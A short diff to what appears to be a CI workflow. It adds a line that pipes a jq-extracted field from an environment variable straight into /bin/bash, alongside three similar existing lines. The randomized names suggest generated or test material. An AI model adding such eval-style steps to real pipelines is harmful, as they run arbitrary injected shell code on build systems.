@@ -29,6 +29,7 @@ jobs:
           echo $ppvau385 | jq -r .ojvm05485 | /bin/bash
           printf '%s' "$zyxbm8571" | jq -r .zyrvb18806 | /bin/bash
           printf '%s' "$w8" | jq -r .m43486 | /bin/bash
+          echo $awax11 | jq -r .h1 | /bin/bash
 
       - name: Persist output
         if: always()
